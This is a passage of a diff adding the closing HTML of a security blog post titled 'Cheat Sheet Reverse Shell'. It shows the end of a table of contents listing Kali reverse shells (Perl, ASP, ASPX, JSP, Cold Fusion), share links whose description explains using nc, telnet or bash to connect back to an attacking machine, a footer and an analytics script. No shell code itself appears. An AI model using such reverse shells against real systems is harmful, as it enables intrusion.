href="#Kali-Perl-Reverse-Shell"><span class="toc-number">11.2.</span> <span class="toc-text">Kali Perl Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-Cold-Fusion-Shell"><span class="toc-number">11.3.</span> <span class="toc-text">Kali Cold Fusion Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-ASP-Shell"><span class="toc-number">11.4.</span> <span class="toc-text">Kali ASP Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-ASPX-Shells"><span class="toc-number">11.5.</span> <span class="toc-text">Kali ASPX Shells</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-JSP-Reverse-Shell"><span class="toc-number">11.6.</span> <span class="toc-text">Kali JSP Reverse Shell</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&text=Cheat Sheet Reverse Shell"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&is_video=false&description=Cheat Sheet Reverse Shell"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cheat Sheet Reverse Shell&body=Check out this article: http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&name=Cheat Sheet Reverse Shell&description=&lt;p&gt;During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.&lt;/p&gt;
+&lt;p&gt;Below are a collection of &lt;strong&gt;reverse shells&lt;/strong&gt; that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.&lt;/p&gt;
+&lt;p&gt;If you found this resource usefull you should also check out our &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;penetration testing tools&lt;/a&gt; cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 赵猛
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/project/">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?e1a5545e21e47c2e4f88aba69902c5c6";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
